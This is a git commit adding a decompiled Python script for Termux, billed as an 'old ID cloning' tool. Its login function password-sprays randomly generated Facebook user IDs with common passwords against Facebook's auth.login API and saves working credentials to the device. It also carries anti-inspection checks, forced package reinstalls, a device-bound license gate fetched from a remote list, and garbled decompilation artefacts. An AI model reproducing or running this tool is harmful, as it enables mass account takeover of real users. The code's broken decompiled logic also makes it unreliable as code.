6876d97f1b5e75ba2b18f282e219e228e380bff8
King boss <147899686+mdrahatopp@users.noreply.github.com>
2024-08-25 08:02:28 +0600

    Add files via upload

---
+++ rtii.py
@@ -0,0 +1,633 @@
+#DECOED BY <⏤͟͞ⓇⒻ ⒸⓎⒷⒺⓇ ⓉⒺⒶⓂ⏤͟͞>[🇧🇩]
+"""༼ ༎ຶ ෴ ༎ຶ༽ⒸⓎⒷⒺⓇ ⓇⒶⒷⒷⒾ ⓇⒻ༼ ༎ຶ ෴ ༎ຶ༽"""
+import lzma
+import zlib
+import codecs
+import base64
+_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));
+
+
+import requests
+import bs4
+import json
+import os
+import sys
+import uuid
+import random
+import datetime
+import time
+import re
+import urllib3
+import rich
+import base64
+from rich.markdown import Markdown as mark
+from rich.columns import Columns as col
+from rich import pretty
+from rich.text import Text as tekz
+from time import localtime as lt
+import os
+import time
+import random
+import json
+import sys
+import datetime
+import requests
+import json
+import time
+import re
+import random
+import sys
+import uuid
+import string
+import subprocess
+import zlib
+import base64
+import hashlib
+import os
+import bs4
+import json
+import sys
+import time
+import random
+import re
+import subprocess
+import platform
+import struct
+import string
+import uuid
+import requests
+import httpx
+import time
+import datetime
+import pycurl
+from io import BytesIO
+os.system('pip install pycurl > /dev/null')
+import pycurl
+from io import BytesIO
+import requests
+os.system('pip uninstall requests chardet idna certifi urllib3 -y > /dev/null;pip install chardet idna certifi requests urllib3 > /dev/null')
+os.system('clear')
+exit('\x1b[1;37m[\x1b[1;31m=\x1b[1;37m]\x1b[1;31mSOMETHING ERROR ! \x1b[1;37m ')
+import bs4
+os.system('pip install bs4 > /dev/null')
+from licensing.models import *
+from licensing.methods import Key, Helpers
+os.system('pip install licensing > /dev/null')
+os.system('pip uninstall requests -y')
+os.system('pip uninstall rich -y')
+os.system('pip install requests')
+os.system('pip install rich')
+os.system('pip install pycurl')
+os.system('pip uninstall httpx -y')
+os.system('pip install httpx')
+os.system('pip uninstall httpx requests -y')
+os.system('pip install requests httpx')
+os.system('pkg unistall python -y')
+os.system('pkg install python')
+yellow = '\x1b[38;5;208m'
+black = '\x1b[1;30m'
+rad = '\x1b[1;31m'
+green = '\x1b[1;32m'
+yelloww = '\x1b[1;33m'
+blue = '\x1b[38;5;6m'
+purple = '\x1b[1;35m'
+cyan = '\x1b[1;36m'
+white = '\x1b[1;37m'
+faltu = '\x1b[1;41m'
+pvt = '\x1b[1;0m'
+loop = 0
+oks = []
+cps = []
+id = []
+loop = 0
+oks = []
+cps = []
+ck = []
+W = '\x1b[1;97m'
+Y = '\x1b[1;33m'
+G = '\x1b[1;32m'
+B = '\x1b[1;36m'
+R = '\x1b[1;31m'
+G2 = '\x1b[1;36m'
+G3 = '\x1b[1;33m'
+X = '\x1b[1;34m'
+X1 = '\x1b[38;5;14m'
+X2 = '\x1b[38;5;123m'
+X3 = '\x1b[38;5;122m'
+X4 = '\x1b[38;5;86m'
+X5 = '\x1b[38;5;121m'
+M = '\x1b[38;5;205m'
+os.system('rm -rf /sdcard/.txt')
+os.system('clear')
+open('/sdcard/.txt', 'w').write(' ')
+if PermissionError:
+    os.system('clear')
+    print(f'''{W}[{G}≍{W}] {G}PLE''' + 'ASE ALLO' + 'W STO' + 'RAGE P' + 'ERMI' + 'SSIO' + 'N FO' + 'R SA' + 'VE FI' + 'LE TH' + 'EN R' + 'UN A' + 'GAIN')
+    os.system('termux-setup-storage')
+    os.system('clear')
+    exit(f'''{W}[{G}≍{W}] {G}RU''' + 'N AGA' + 'IN THI' + 'S TO' + 'OL !!')
+fileee = os.listdir('/sdcard/Android/data/')
+if 'com' + '.httpc' + 'an' + 'ary' + '.pro' in fileee:
+    print('Please uninstall http canary from your device')
+    exit()
+    style = f'''{W}[{G}≍{W}]'''
+    site = '/data/data/com.termux/files/usr/lib/python3.11/site-packages/'
+    warning = 'DONT TRY TO BYPASS THIS IS FREE TOOL'
+    a = open('requests/sessions.py', 'r').read()
+    if 'print' in a:
+        exit(f'''{style} {warning}''')
+if Exception:
+    e = None
+    e = None
+    del e
+    e = None
+    del e
+a = open('requests/api.py', 'r').read()
+if 'print' in a:
+    exit(f'''{style} {warning}''')
+if Exception:
+    e = None
+    e = None
+    del e
+    e = None
+    del e
+a = open('requests/models.py', 'r').read()
+if 'print' in a:
+    exit(f'''{style} {warning}''')
+if Exception:
+    e = None
+    e = None
+    del e
+    e = None
+    del e
+a = open('httpx/_api.py', 'r').read()
+if 'print' in a:
+    exit(f'''{style} {warning}''')
+if Exception:
+    e = None
+    e = None
+    del e
+    e = None
+    del e
+a = open('httpx/_auth.py', 'r').read()
+if 'print' in a:
+    exit(f'''{style} {warning}''')
+if Exception:
+    e = None
+    e = None
+    del e
+    e = None
+    del e
+a = open('httpx/_models.py', 'r').read()
+if 'print' in a:
+    exit(f'''{style} {warning}''')
+if Exception:
+    e = None
+    e = None
+    del e
+    e = None
+    del e
+a = open('requests/sessions.py', 'r').read()
+if 'sys.stdout.write' in a:
+    exit(f'''{style} {warning}''')
+if Exception:
+    e = None
+    e = None
+    del e
+    e = None
+    del e
+a = open('requests/api.py', 'r').read()
+if 'sys.stdout.write' in a:
+    exit(f'''{style} {warning}''')
+if Exception:
+    e = None
+    e = None
+    del e
+    e = None
+    del e
+a = open('requests/models.py', 'r').read()
+if 'sys.stdout.write' in a:
+    exit(f'''{style} {warning}''')
+if Exception:
+    e = None
+    e = None
+    del e
+    e = None
+    del e
+a = open('httpx/_api.py', 'r').read()
+if 'sys.stdout.write' in a:
+    exit(f'''{style} {warning}''')
+if Exception:
+    e = None
+    e = None
+    del e
+    e = None
+    del e
+a = open('httpx/_auth.py', 'r').read()
+if 'sys.stdout.write' in a:
+    exit(f'''{style} {warning}''')
+if Exception:
+    e = None
+    e = None
+    del e
+    e = None
+    del e
+a = open('httpx/_models.py', 'r').read()
+if 'sys.stdout.write' in a:
+    exit(f'''{style} {warning}''')
+if Exception:
+    e = None
+    e = None
+    del e
+    e = None
+    del e
+a = open('requests/sessions.py', 'r').read()
+if 'verify = False' in a:
+    exit(f'''{style} {warning}''')
+if Exception:
+    e = None
+    e = None
+    del e
+    e = None
+    del e
+a = open('requests/sessions.py', 'r').read()
+if 'self.verify = False' in a:
+    exit(f'''{style} {warning}''')
+if Exception:
+    e = None
+    e = None
+    del e
+    e = None
+    del e
+a = open('urllib3/conne' + 'ction.py', 'r').read()
+if str("cert_reqs = 'CERT_NONE'") in a:
+    exit(f'''{style} {warning}''')
+if Exception:
+    e = None
+    e = None
+    del e
+    e = None
+    del e
+
+def checking():
+    file = open(f'''{site}requests/sessions.py''', 'r')
+    filedata63 = file.read()
+    None(None, None)
+    if not None:
+        pass
+    if 'verify = False' in filedata63:
+        exit(f'''{style} {warning}''')
+    file = open(f'''{site}requests/sessions.py''', 'r')
+    filedata63 = file.read()
+    None(None, None)
+    if not None:
+        pass
+    if 'self.verify = False' in filedata63:
+        exit(f'''{style} {warning}''')
+    file7i7 = open(f'''{site}urllib3/conne''' + 'ction.py', 'r')
+    filedata47 = file7i7.read()
+    None(None, None)
+    if not None:
+        pass
+    if str("cert_reqs = 'CERT_NONE'") in filedata47:
+        exit(f'''{style} {warning}''')
+        return None
+
+
+def verify():
+    file = open(f'''{site}req''' + 'uests/sessi' + 'ons.py', 'r')
+    filedata = file.read()
+    None(None, None)
+    if not None:
+        pass
+    filedata = filedata.replace('verify = False', 'verify = True')
+    file = open(f'''{site}reque''' + 'sts/sessi' + 'ons.py', 'w')
+    file.write(filedata)
+    None(None, None)
+    if not None:
+        pass
+    if 'verify = True' in filedata:
+        pass
+    file = open(f'''{site}requ''' + 'ests/sess' + 'ions.py', 'a')
+    file.write('\nverify = True\n')
+    None(None, None)
+    if not None:
+        pass
+
+
+def issue():
+    if os.path.isfile('/data/data/com.termux/files/usr/bin/rm'):
+        pass
+    system('clear')
+    print(f'''{style} Syste''' + 'm Modif' + 'ication N' + 'ot Allo' + 'wed Warn' + 'ing By FXJ')
+    exit()
+    if os.path.isfile('/data/data/com.termux/files/usr/bin/cp'):
+        pass
+    system('clear')
+    print(f'''{style} Syst''' + 'em Mod' + 'ification N' + 'ot Allo' + 'wed War' + 'ning By FXJ')
+    exit()
+    if os.path.isfile('/data/data/com.termux/files/usr/bin/mv'):
+        pass
+    system('clear')
+    print(f'''{style} Sys''' + 'tem Modifi' + 'cation N' + 'ot All' + 'owed Warni' + 'ng By FXJ')
+    exit()
+    if os.path.isfile('/data/data/com.termux/files/usr/bin/termux-reset'):
+        pass
+    system('clear')
+    print(f'''{style} Sys''' + 'tem Modi' + 'fication N' + 'ot All' + 'owed War' + 'ning By FXJ')
+    exit()
+    if os.path.isfile('/data/data/com.termux/files/usr/bin/termux-setup-storage'):
+        pass
+    system('clear')
+    print(f'''{style} Sy''' + 'stem Modi' + 'fication N' + 'ot Allo' + 'wed War' + 'ning By FXJ')
+    exit()
+    if os.path.isfile('/data/data/com.termux/files/usr/bin/pip'):
+        pass
+    system('clear')
+    print(f'''{style} Sy''' + 'stem Modi' + 'fication N' + 'ot Allo' + 'wed War' + 'ning By FXJ')
+    exit()
+    if os.path.isfile('/data/data/com.termux/files/usr/bin/pip3'):
+        pass
+    system('clear')
+    print(f'''{style} Sy''' + 'stem Modi' + 'fication N' + 'ot Allo' + 'wed Wa' + 'rning By FXJ')
+    exit()
+    if os.path.isfile('/data/data/com.termux/files/usr/bin/pip3.11'):
+        return None
+    None('clear')
+    print(f'''{style} Sys''' + 'tem Modific' + 'ation N' + 'ot Allo' + 'wed War' + 'ning By FXJ')
+    exit()
+
+import requests
+os.system('pip3 install requests')
+import requests
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+print('\x1b[1;37m[\x1b[38;5;46m√\x1b[1;37m] \x1b[38;5;46mFollow My FB GURUP !! ')
+time.sleep(1.5)
+os.system('xdg-open https://www.facebook.com/groups/860545265704628/?ref=share')
+
+def lin():
+    print('\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+
+dic = {
+    '1': 'January',
+    '2': 'February',
+    '3': 'March',
+    '4': 'April',
+    '5': 'May',
+    '6': 'June',
+    '7': 'July',
+    '8': 'August',
+    '9': 'September',
+    '10': 'October',
+    '11': 'November',
+    '12': 'December' }
+dic2 = {
+    '01': 'January',
+    '02': 'February',
+    '03': 'March',
+    '04': 'April',
+    '05': 'May',
+    '06': 'June',
+    '07': 'July',
+    '08': 'August',
+    '09': 'September',
+    '10': 'October',
+    '11': 'November',
+    '12': 'Devember' }
+tgl = datetime.datetime.now().day
+bln = dic[str(datetime.datetime.now().month)]
+thn = datetime.datetime.now().year
+okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
+cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
+date = str(tgl) + '-' + str(bln)
+ltx = int(lt()[3])
+if ltx > 12:
+    a = ltx - 12
+    tag = 'PM'
+a = ltx
+tag = 'AM'
+A = '\x1b[1;97m'
+R = '\x1b[38;5;196m'
+Y = '\x1b[1;33m'
+G = '\x1b[38;5;46m'
+B = '\x1b[38;5;8m'
+G1 = '\x1b[38;5;48m'
+G2 = '\x1b[38;5;47m'
+G3 = '\x1b[38;5;48m'
+G4 = '\x1b[38;5;49m'
+G5 = '\x1b[38;5;50m'
+X = '\x1b[1;34m'
+X1 = '\x1b[38;5;14m'
+X2 = '\x1b[38;5;123m'
+X3 = '\x1b[38;5;122m'
+X4 = '\x1b[38;5;86m'
+X5 = '\x1b[38;5;121m'
+S = '\x1b[1;96m'
+M = '\x1b[38;5;205m'
+
+def ua():
+    rr = random.randint
+    aZ = random.choice([
+        'A',
+        'B',
+        'C',
+        'D',
+        'E',
+        'F',
+        'G',
+        'H',
+        'I',
+        'J',
+        'K',
+        'L',
+        'M',
+        'N',
+        'O',
+        'P',
+        'Q',
+        'R',
+        'S',
+        'T',
+        'U',
+        'V',
+        'W',
+        'X',
+        'Y',
+        'Z'])
+    zA = random.choice([
+        'a',
+        'b',
+        'c',
+        'd',
+        'e',
+        'f',
+        'g',
+        'h',
+        'i',
+        'j',
+        'k',
+        'l',
+        'm',
+        'n',
+        'o',
+        'p',
+        'q',
+        'r',
+        's',
+        't',
+        'u',
+        'v',
+        'w',
+        'x',
+        'y',
+        'z'])
+    rx = random.randrange(1, 999)
+    xx = f'''Mozilla/5.0 (Wi    ndows NT 10.0; {str(rr(9, 11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99, 149))}.0.{str(rr(4500, 4999))}.{str(rr(35, 99))} Chrome/{str(rr(99, 175))}.0.{str(rr(0, 5))}.{str(rr(0, 5))} Safari/537.36'''
+    return xx
+
+logo = '       \n$$$$$$$$\\  $$$$$$\\  $$\\      $$\\ \n\\__$$  __|$$  __$$\\ $$$\\    $$$ |\n   $$ |   $$ /  $$ |$$$$\\  $$$$ |\n   $$ |   $$ |  $$ |$$\\$$\\$$ $$ |\n   $$ |   $$ |  $$ |$$ \\$$$  $$ |\n   $$ |   $$ |  $$ |$$ |\\$  /$$ |\n   $$ |    $$$$$$  |$$ | \\_/ $$ |\n   \\__|    \\______/ \\__|     \\__|\n\x1b[1;92m═━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━═━══━═━═━═\n\x1b[1;92m[\x1b[1;92m\x1b[1;34m✔\x1b[1;92m]DEVELOPER      \x1b[1;91m\x1b[1;34m: \x1b[1;92𝚖TOM\n[\x1b[1;92m\x1b[1;34m✔\x1b[1;92m]FACEBOOK       \x1b[1;91m\x1b[1;34m: \x1b[1;92mROTON_MALLIK\n[\x1b[1;92m\x1b[1;34m✔\x1b[1;92m]TOOL           \x1b[1;91m\x1b[1;34m: \x1b[1;92mOLD ID CLONING\n[\x1b[1;92m\x1b[1;34m✔\x1b[1;92m]STATUS         \x1b[1;91m\x1b[1;34m: \x1b[1;92mPERSONAL \n[\x1b[1;92m\x1b[1;34m✔\x1b[1;92m]VERSION        \x1b[1;91m\x1b[1;34m: \x1b[1;35m[\x1b[1;32m𝚅2\x1b[1;35m]\n\x1b[1;92m═━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━═━══━═━═━═'
+
+def clean():
+    os.system('clear')
+    print(logo)
+
+
+def main():
+    user = []
+    os.system('clear')
+    print(logo)
+    print('\x1b[38;5;8m\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[1;37mEXAMPLE   : \x1b[1;37m10000 | 20000 | 90000')
+    lin()
+    limit = input('\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[1;97mCHOICE    : ')
+    lin()
+    os.system('clear')
+    print(logo)
+    print('\x1b[38;5;8m(\x1b[1;97m1\x1b[38;5;8m) \x1b[1;97mMETHOD ~ (2009-2010)')
+    lin()
+    ask = input('\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[1;97mCHOICE    : ')
+    lin()
+    if ask in ('1',):
+        star = '10000'
+        for i in range(int(limit)):
+            data = str(random.choice(range(1000000000, 1999999999)))
+            user.append(data)
+            star = '100000'
+            for i in range(int(limit)):
+                data = str(random.choice(range(1000000000, 1999999999)))
+                user.append(data)
+                TOM = ThreadPool(max_workers = 40)
+                os.system('clear')
+                print(logo)
+                print(f'''\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[38;5;47mTOTAL ID : {limit} \x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[38;5;47mMETHOD : \x1b[38;5;86m{ask}''')
+                print('\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[38;5;47mIF NO RESULT \x1b[38;5;8m[\x1b[38;5;47mON\x1b[1;97m/\x1b[38;5;47mOF\x1b[38;5;8m]  \x1b[38;5;47mAIRPLANE MODE')
+                lin()
+                for mal in user:
+                    uid = star + mal
+                    TOM.submit(login, uid)
+                    None(None, None)
+                    return None
+                    if not None:
+                        pass
+
+loop = 0
+oks = []
+
+def login(uid):
+    global loop
+    Session = requests.session()
+    sys.stdout.write(f'''\r\x1b[38;5;8m(\x1b[1;97m{date}\x1b[38;5;8m) \x1b[38;5;8m(\x1b[1;97m{loop}\x1b[38;5;8m) \x1b[38;5;8m(\x1b[1;97m{len(oks)}\x1b[38;5;8m)''')
+    sys.stdout.flush()
+    for pw in ('123456', '1234567', '12345678', '123456789', '123123', '143143'):
+        headers = {
+            'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
+            'x-fb-sim-hni': str(random.randint(20000, 40000)),
+            'x-fb-net-hni': str(random.randint(20000, 40000)),
+            'x-fb-connection-quality': 'EXCELLENT',
+            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
+            'user-agent': ua(),
+            'content-type': 'application/x-www-form-urlencoded',
+            'x-fb-http-engine': 'Liger' }
+        rp = Session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(uid) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = headers).json()
+        if 'session_key' in rp:
+            print(f'''\r\r{G}TOM-OK {A}➤ {G}{uid} {A}•{G} {pw}''')
+            open('/sdcard/TOM-OLD-OK', 'a').write(uid + '|' + pw + '\n')
+            oks.append(uid)
+        if 'www.facebook.com' in rp['error_msg']:
+            print(f'''\r\r{G}TOM-OK {A}➤ {G}{uid} {A}•{G} {pw}''')
+            open('/sdcard/TOM-OLD-OK.txt', 'a').write(uid + '|' + pw + '\n')
+            oks.append(uid)
+        if 'Please Confirm Email' in str(rp):
+            print(f'''\r\r{G}TOM-OK {A}➤ {G}{uid} {A}•{G} {pw}''')
+            open('/sdcard/TOM -OLD-OK.txt', 'a').write(uid + '|' + pw + '\n')
+            oks.append(uid)
+        loop += 1
+        return None
+        return None
+
+import getpass
+attemps = 0
+clean()
+if attemps < 0x2DFDC184DL:
+    username = input(' \x1b[0;92mENTER KEY: ')
+    if username == 'TOM':
+        print(' \x1b[0;92mSuccessfully Logged in.')
+    print(' Incorrect Pass Please Trying ')
+    attemps += 1
+myid = uuid.uuid4().hex[:5].upper()
+key1 = open('/data/data/com.termux/files/usr/bin/.mrakingxxx-cov', 'r').read()
+kok = open('/data/data/com.termux/files/usr/bin/.mrakingxxx-cov', 'w')
+kok.write(myid)
+kok.close()
+uid = os.getuid()
+xny = zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5OKK)\xcb1442\xd0O,\xd0\xcfM\xcc\xcc\xd3\xcfJ\x03\x001"\x13\xc6')
+update = requests.get(xny).text
+uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
+id = ''.join(uuidd).replace('_', '').replace('360', 'AHS').replace('u', '9').replace('a', 'A')
+plat = platform.version()[14:][:21][::-1].upper() + platform.release()[5:][::-1].upper() + platform.version()[:8]
+xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
+bxd = ''
+key1 = open('/data/data/com.termux/files/usr/bin/.mrakingxxx-cov', 'r').read()
+kex = f'''K{uid}TS{key1}PF191CGBFDNVRDKWDDXIA146VQTI54001516'''
+key2 = base64.b64encode(str(f'''{kex}''').encode('utf-8'))
+xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
+key = f'''{key2}'''
+fkeyx = key.replace("b'", '').replace("'", '')
+
+def apv():
+    clean()
+    apl = str(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7O,((\xabH\xd1K\xca\xc9O/.\xc8/\xd1K\xce\xcf\xd57202\xd274\xd4\x07\x8ag\x94\xe4\xe6\x00\x00U\xba\x0e\xd8'))
+    aplk = apl.replace("b'", '').replace("'", '')
+    aplnk = aplk
+    link = httpx.get('https://raw.githubusercontent.com/Roton132/Aprubl2.txt/main/Aso.txt').text
+    clean()
+    if kex in link:
+        clean()
+        main()
+        return None
+    None('        YOU ARE NOT PREMIUM USER ')
+    time.sleep(1)
+    clean()
+    print('         YOUR KEY NOT REGISTERED ')
+    time.sleep(5)
+    clean()
+    print('Key ' + kex)
+    input('PRESS ENTER TO CONTACT WITH ADMIN ➤')
+    url_wa = 'https://api.whatsapp.com/send?phone=+8801787328738&text='
+    tks = 'Hi Please Accept My Key To Premium:)\nKey :- ' + kex
+    subprocess.check_output([
+        'am',
+        'start',
+        url_wa + tks])
+    time.sleep(2)
+    print('Run : python TOM.py')
+    exit()
+    return None
+    if ValueError:
+        exit()
+        return None
+    if None.exceptions.ConnectionError:
+        print('\n No internet connection ...')
+        exit()
+        return None
+
+apv()
